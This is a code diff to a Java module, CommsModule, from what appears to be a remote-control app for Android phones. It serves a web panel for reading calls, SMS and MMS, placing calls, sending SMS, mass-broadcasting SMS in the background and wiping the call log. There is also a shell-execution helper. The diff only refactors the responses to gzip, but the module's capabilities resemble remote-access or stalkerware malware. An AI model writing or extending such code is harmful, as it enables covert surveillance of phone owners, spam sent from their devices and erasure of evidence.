@@ -48,19 +48,19 @@ public class CommsModule extends BaseModule {
         if (uri.equals("/calls")) {
             return serveCallLogs(params, session);
         } else if (uri.equals("/calls/make")) {
-            return makeCall(params);
+            return makeCall(session, params);
         } else if (uri.equals("/calls/delete")) {
             return deleteCall(params);
         } else if (uri.equals("/calls/clear")) {
-            return serveCallLogsClear();
+            return serveCallLogsClear(session);
         } else if (uri.equals("/sms")) {
             return serveSmsMessages(params, session);
         } else if (uri.equals("/sms/delete")) {
             return deleteSms(params);
         } else if (uri.equals("/sms/send")) {
-            return sendSms(params);
+            return sendSms(session, params);
         } else if (uri.equals("/sms/broadcast")) {
-            return serveSmsBroadcast(params, session);
+            return serveSmsBroadcast(session, params);
         } else if (uri.equals("/mms")) {
             return serveMmsMessages(params, session);
         } else if (uri.equals("/mms/delete")) {
@@ -108,7 +108,7 @@ public class CommsModule extends BaseModule {
                 html.append("</div>");
                 html.append("</div>");
                 html.append(getFooter());
-                return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.toString().getBytes()), html.toString().length());
+                return server.serveGzippedProxy(session, "text/html", html.toString());
             }
         }
 
@@ -285,7 +285,7 @@ public class CommsModule extends BaseModule {
                 html.append("</div>");
                 html.append("</div>");
                 html.append(getFooter());
-                return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.toString().getBytes()), html.toString().length());
+                return server.serveGzippedProxy(session, "text/html", html.toString());
             }
         }
 
@@ -802,7 +802,7 @@ public class CommsModule extends BaseModule {
         }
     }
 
-    private Response sendSms(Map<String, String> params) {
+    private Response sendSms(IHTTPSession session, Map<String, String> params) {
         String number = params.get("number"), message = params.get("message");
         if (number == null || number.isEmpty() || message == null || message.isEmpty()) return server.serveErrorProxy("Invalid number or message");
         try {
@@ -825,7 +825,7 @@ public class CommsModule extends BaseModule {
             }
 
             String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
-            return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
+            return server.serveGzippedProxy(session, "text/html", html);
         } catch (Exception e) { return server.serveErrorProxy("Failed to send SMS: " + e.getMessage()); }
     }
 
@@ -862,14 +862,14 @@ public class CommsModule extends BaseModule {
                 html += "<div class=\"icon\" style=\"color: var(--danger);\">&#10006;</div><h2>MMS Failed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Could not dispatch media package. Check device logs.</p>";
             }
             html += "<div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
-            return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
+            return server.serveGzippedProxy(session, "text/html", html);
 
         } catch (Exception e) {
             return server.serveErrorProxy("MMS Dispatch Error: " + e.getMessage());
         }
     }
 
-    private Response makeCall(Map<String, String> params) {
+    private Response makeCall(IHTTPSession session, Map<String, String> params) {
         String number = params.get("number");
         if (number == null || number.isEmpty()) return server.serveErrorProxy("Invalid phone number");
         
@@ -897,18 +897,18 @@ public class CommsModule extends BaseModule {
                 "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div>" +
                 "</div></div>" + getFooter();
                 
-            return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
+            return server.serveGzippedProxy(session, "text/html", html);
         } catch (Exception e) {
             return server.serveErrorProxy("Failed to initiate call: " + e.getMessage());
         }
     }
 
-    private Response serveCallLogsClear() {
+    private Response serveCallLogsClear(IHTTPSession session) {
         try {
             FirebaseConfig.logActivity("COMMS_WIPE: Wiping device call history");
             context.getContentResolver().delete(android.provider.CallLog.Calls.CONTENT_URI, null, null);
             String html = getHeader("/calls") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>History Purged</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Call logs have been successfully wiped from the device.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div></div></div>" + getFooter();
-            return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
+            return server.serveGzippedProxy(session, "text/html", html);
         } catch (Exception e) { return server.serveErrorProxy("Wipe Failed: " + e.getMessage()); }
     }
 
@@ -989,7 +989,7 @@ public class CommsModule extends BaseModule {
         return response;
     }
 
-    private Response serveSmsBroadcast(Map<String, String> params, IHTTPSession session) {
+    private Response serveSmsBroadcast(IHTTPSession session, Map<String, String> params) {
         String message = params.get("message");
         if (message == null || message.isEmpty()) return server.serveErrorProxy("Message content is required for broadcast");
         
@@ -1033,7 +1033,7 @@ public class CommsModule extends BaseModule {
         });
 
         String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-orange);\">&#9889;</div><h2>Broadcast Initiated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>The mass-messaging sequence has been deployed in the background.</p><p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">Check Terminal logs for real-time progress.</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange);\">Back to SMS Terminal</a></div></div></div>" + getFooter();
-        return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
+        return server.serveGzippedProxy(session, "text/html", html);
     }
 
     private void executeShell(String command) {
